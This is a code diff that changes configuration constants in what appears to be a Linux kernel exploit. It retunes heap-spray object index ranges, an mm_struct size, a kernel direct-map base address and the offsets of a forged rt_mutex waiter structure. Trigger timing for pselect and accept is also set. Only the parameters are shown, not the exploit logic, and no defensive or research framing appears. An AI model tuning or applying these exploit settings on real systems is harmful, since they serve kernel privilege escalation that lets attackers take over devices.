@@ -48,7 +48,7 @@
 // ============================================================================
 // KERNELSNITCH & HEAP CONFIGS
 // ============================================================================
-#define MM_STRUCT_SZ 0x3C0
+#define MM_STRUCT_SZ 0x400
 #define MM_ORDER 3
 #define KERNELSNITCH_MTE_ENABLED 1
 #define KERNELSNITCH_VERBOSE 1
@@ -71,10 +71,10 @@
 #define APP_DEFER_FINAL_DRAIN_REAP 1
 #define APP_DEFER_ALL_DRAIN_REAPS 1
 #define APP_QUIET_RECLAIM_WINDOW 1
-#define APP_SLIDE_MIN_OBJECT_INDEX 5
-#define APP_SLIDE_MAX_OBJECT_INDEX 20
+#define APP_SLIDE_MIN_OBJECT_INDEX  2
+#define APP_SLIDE_MAX_OBJECT_INDEX 28
 #define APP_FOPS_MIN_OBJECT_INDEX 24
-#define APP_RECLAIM_MAX_DIRECT_BASE 0xffffff8080000000ULL
+#define APP_RECLAIM_MAX_DIRECT_BASE  0xffffff9000000000ULL
 #define APP_PSELECT_TRIGGER_MAX_AGE_USEC 150000
 #define APP_ACCEPT_SCHED_TRIGGER 1
 #define APP_PSELECT_POST_GUARD_AGE_CHECK 1
@@ -220,7 +220,7 @@
 // FAKE WAITER LAYOUT - FORMATO COMPACTO (kernel 6.1+)
 // ============================================================================
 #define FAKE_WAITER_LAYOUT_SIZE       0x58
-
+#define COMPACT_RT_MUTEX_WAITER 1
 #define FAKE_WAITER_TREE_ENTRY_OFF    0x00
 #define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
 #define FAKE_WAITER_TASK_OFF          0x30
